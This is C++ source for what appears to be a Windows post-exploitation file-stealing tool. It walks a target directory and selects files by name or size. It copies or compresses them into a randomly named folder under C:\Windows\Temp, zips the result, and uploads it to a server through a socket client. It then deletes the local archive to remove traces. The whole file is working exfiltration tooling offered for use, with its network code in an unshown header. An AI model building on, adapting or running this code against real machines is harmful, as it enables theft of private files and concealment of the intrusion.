#define _CRT_SECURE_NO_WARNINGS
#include "clipp.h"
#include <WinSock2.h>                //头文件
#pragma comment(lib,"ws2_32.lib")    //库文件
#include "client.h"
#include "ZipFunction.h"
#include "FileFunction.h"
#include <stdlib.h>
#include <atlstr.h>
#include <windows.h>
#include <stdio.h>
#include <string>
#include <tchar.h>
#include <psapi.h>
#include <typeinfo>
#include <iostream>
#include <vector>
#include <random>
#include <io.h>
#include <direct.h>
#include <fstream>


using std::cout;
using std::string;
using namespace std;
using namespace clipp;

//字符串分割函数
std::vector<std::string> split(std::string str, std::string pattern)
{
    std::string::size_type pos;
    std::vector<std::string> result;
    str += pattern; //扩展字符串以方便操作
    int size = str.size();
    for (int i = 0; i < size; i++)
    {
        pos = str.find(pattern, i);
        if (pos < size)
        {
            std::string s = str.substr(i, pos - i);
            result.push_back(s);
            i = pos + pattern.size() - 1;
        }
    }
    return result;
}

/*
#根据文件名或目录名打包
*/
std::string GetZipFilesByName(std::string sourcePathOwn,std::string FileNameOwn) {
    std::string FullFilePath;
    std::string newFile;

    //创建压缩目录
    std::string zipFilePath;
    zipFilePath = "C:\\Windows\\Temp\\" + GetRandomFileName(15);
    CreateFolder(zipFilePath);

    //string FileNameOwn = "3-1 课程总结_ev.mp4,8-PHP框架漏洞分析详解.pptx,thinkphp.txt,zzzzz";

    std::vector<std::string> result = split(FileNameOwn, ",");
    for (int i = 0; i < result.size(); i++)
    {
        FullFilePath = sourcePathOwn + "\\" + result[i];
        if (IsDirectory(FullFilePath.data()))
        {
            cout << FullFilePath << endl;
            //计算文件夹大小
            long a = getFileSize(FullFilePath);
            cout << "文件夹大小为: " << a << "B " << a / 1024 << "KB\n";
            //移动
            newFile = zipFilePath + "\\" + result[i] + ".zip";
            CompressDirToZip((char*)FullFilePath.data(), (char*)newFile.data());
            cout << "符合条件" << endl;
        }
        else {
            cout << FullFilePath << endl;
            long a_filesize = readFiles(FullFilePath.data());   //计算文件大小
            newFile = zipFilePath + "\\" + result[i];
            CopyFiles((char*)FullFilePath.data(), (char*)newFile.data());
            cout << "符合条件" << endl;
        }
    }

    return zipFilePath;
}
/*
#遍历目录下的文件
*/
std::string GetZipFiles(std::string sourcePathOwn, long LessThanOwn, long GreaterThanOwn, std::string FileSizeOwn, long DirLessThanOwn, long AllLessThanOwn) {

    vector<string> fileNames;
    string path(sourcePathOwn);
    std::string zipFilePath;

    //创建压缩目录
    if (FileSizeOwn == "off") {
        zipFilePath = "C:\\Windows\\Temp\\" + GetRandomFileName(15);
        CreateFolder(zipFilePath);
    }

    GetFileNames(path, fileNames);
    for (const auto& ph : fileNames) {
        std::string result;
        std::string newFile;
        string::size_type pos;

        pos = ph.rfind("\\");
        result = ph.substr(pos + 1);
        if (result == "." || result == "..") {
            continue;
        }
        else
        {
            if (IsDirectory(ph.data())) 
            {
                cout << ph << endl;
                if (FileSizeOwn == "on" || FileSizeOwn == "ON") {
                    long a  = getFileSize(ph); //计算文件夹大小
                    cout << "文件夹大小为: " << a << "B " << a / 1024 << "KB\n";
                }
                else {
                    long b = getFileSize(ph);
                    cout << "文件夹大小为: " << b << "B " << b / 1024 << "KB\n";
                    if (AllLessThanOwn != 862208) {
                        if (b < long(AllLessThanOwn * 1024)) {
                            newFile = zipFilePath + "\\" + result + ".zip";
                            CompressDirToZip((char*)ph.data(), (char*)newFile.data());
                            cout << "符合条件" << endl;
                        }
                    }
                    //说明传了DirLessThanOwn参数
                    else if (DirLessThanOwn != 973824) {
                        if (b < long(DirLessThanOwn * 1024)) {
                            newFile = zipFilePath + "\\" + result + ".zip";
                            CompressDirToZip((char*)ph.data(), (char*)newFile.data());
                            cout << "符合条件" << endl;
                        }
                    }else if(b < 41943040) {//默认40M
                        newFile = zipFilePath + "\\" + result + ".zip";
                        CompressDirToZip((char*)ph.data(), (char*)newFile.data());
                        cout << "符合条件" << endl;
                    }
                }
            }
            else
            {
                //readFiles 返回b(比特)
                cout << ph << endl;
                if (FileSizeOwn == "on" || FileSizeOwn == "ON") {
                    long a_filesize = readFiles(ph.data());   //计算文件大小
                }
                else {
                    long a_filesize = readFiles(ph.data());   //计算文件大小,返回大小为b
                    if (AllLessThanOwn != 862208) {
                        if (a_filesize <= long(AllLessThanOwn * 1024 + 1024)) {
                            newFile = zipFilePath + "\\" + result;
                            CopyFiles((char*)ph.data(), (char*)newFile.data());
                            cout << "符合条件" << endl;
                        }
                    }
                    //说明传了gt和lt的参数
                    else if (GreaterThanOwn != 1048576 && LessThanOwn != 10240) {
                        if (a_filesize >= long(GreaterThanOwn * 1024 - 1024) && a_filesize <= long(LessThanOwn * 1024 + 1024)) {
                            newFile = zipFilePath + "\\" + result;
                            CopyFiles((char*)ph.data(), (char*)newFile.data());
                            cout << "符合条件" << endl;
                        }
                    }
                    //传gt
                    else if (GreaterThanOwn != 1048576) {
                        if (a_filesize >= long(GreaterThanOwn * 1024 - 1024)) {
                            newFile = zipFilePath + "\\" + result;
                            CopyFiles((char*)ph.data(), (char*)newFile.data());
                            cout << "符合条件" << endl;
                        }
                    }
                    //判断lt
                    else if (a_filesize <= long(LessThanOwn * 1024 + 1024)) {
                        newFile = zipFilePath + "\\" + result;
                        CopyFiles((char*)ph.data(), (char*)newFile.data());
                        cout << "符合条件" << endl;
                    }
                }
            }
        }
    }
    return zipFilePath;
}

int main(int argc, char** argv)
{
    std::string zipFilePath;
    /*命令行参数解析*/
    std::string sourcePathOwn = "";
    std::string FileNameOwn = "";
    //（写kb）
    long LessThanOwn = 10240;//小于等于 以kb为单位(默认10m) 10m = 1024kb
    long GreaterThanOwn = 1048576;//大于等于 以kb为单位(默认1G)
    long DirLessThanOwn = 973824; //(b) 小于等于 以kb为单位(默认951m)
    long AllLessThanOwn = 862208; //(b) 小于等于 以kb为单位(默认842m)
    std::string FileSizeOwn = "off"; //查看文件大小

    auto cli = (
        option("-sp", "-SP", "--SourcePath") & value("SourcePath", sourcePathOwn),
        option("-fs", "-FS", "--FileSize") & value("FileSize", FileSizeOwn),
        option("-fn", "-FN", "--FileName") & value("FileName", FileNameOwn),
        option("-flt", "-FLT", "--FileLessThan") & value("FileLessThan", LessThanOwn),
        option("-fgt", "-FGT", "--FileGreaterThan") & value("FileGreaterThan", GreaterThanOwn),
        option("-dlt", "-DLT", "--DirLessThan") & value("DirLessThan", DirLessThanOwn),
        option("-alt", "-ALT", "--AllLessThan") & value("AllLessThan", AllLessThanOwn)
        );
    if (parse(argc, const_cast<char**>(argv), cli)) {
        //std::cout << "ProcessName: " << processNameOwn << "\n";
    }
    else {
        std::cerr << make_man_page(cli, argv[0]) << std::endl;
    }

    if (sourcePathOwn == "") {
        std::exit(0);
    }
    if (FileNameOwn != "") {
        zipFilePath = GetZipFilesByName(sourcePathOwn,FileNameOwn);
    }
    else {
        zipFilePath = GetZipFiles(sourcePathOwn, LessThanOwn, GreaterThanOwn, FileSizeOwn, DirLessThanOwn, AllLessThanOwn);
    }
    if (FileSizeOwn == "on" || FileSizeOwn == "ON") {
        std::exit(0);
    }
    
    /*压缩整个文件夹*/
    std::string newZipFilePath = zipFilePath + ".zip";
    CompressDirToZip((char*)zipFilePath.data(), (char*)newZipFilePath.data());
    /*删除文件夹*/
    DeleteDirectory((char*)zipFilePath.data());
    //输出目的路径
    cout << "上传服务器路径为: " << newZipFilePath.data() << endl;
    //上传zip到服务器
    ClientSocketUpload((char*)newZipFilePath.data());
    // 删除zip文件
    DeleteFiles((char*)newZipFilePath.data());
	return 0;
}